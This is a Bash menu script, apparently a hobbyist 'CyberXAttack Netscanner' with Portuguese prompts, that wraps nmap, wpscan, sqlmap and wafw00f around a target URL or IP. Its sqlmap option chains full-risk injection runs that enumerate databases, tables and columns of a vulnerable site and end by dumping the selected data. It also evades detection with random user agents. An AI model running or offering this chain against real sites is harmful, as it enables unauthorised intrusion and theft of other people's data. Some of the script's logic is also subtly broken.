#!/bin/bash
x="teste"
trap 'echo "\n";stop' 2
menu ()
{
while true $x != "teste"
do
clear
echo "================================================"
echo "|       CyberXAttack Netscanner                |"
echo  "==============================================="
echo ""
echo "1)nmap"
echo""
echo "2)wpscan"
echo ""
echo "3)sqlmap"
echo ""
echo "4)wafw00f"
echo""
echo "5)sair"

echo "================================================"

echo "Digite a opção desejada:"
read x
echo "Opção informada ($x)"
echo "================================================"

case "$x" in


    1)
      echo "Informe a URL ou IP"
      read site
      cd nmap
      nmap -v -sT -sC -sV -Pn -d --open  $site
           
echo "================================================"
;;
    2)
      echo "Informe a URL"
      read site
      cd wpscan
      wpscan --url $site --enumerate
       
echo "================================================"
;;
    3)
       echo "Informe a URL com vulnerabilidade"
       read site
       cd sqlmap
       sqlmap -u "$site" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
       echo "Enter the name of the database you got from sqlmap"
       read db
       sqlmap -u "$site" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D $db --tables
       echo "enter the table to view its columns"
       read tb
       sqlmap -u "$site" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D $db -T $tb --columns
       echo "Enter the column to dump data use , (comma) for multiple columns :"
       read col
       sqlmap -u "$site" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D $db -T $tb -C $col --dump 
       
echo "================================================"
;;
     4)
       echo "Informe a URL"
            read site
            cd wafw00f
            wafw00f $site
 
echo "================================================"
;;
       5)
         echo "saindo..."
         sleep 5
         clear;
         exit;
echo "================================================"
;;

*)
        echo "Opção inválida!"
esac
sleep 60
done

}
menu

     echo "\e[1;92m[*] ~~~~~~~~ ~~~~~~~~ echon\n"
     echo "Obrigada por Testar "

     echo " "





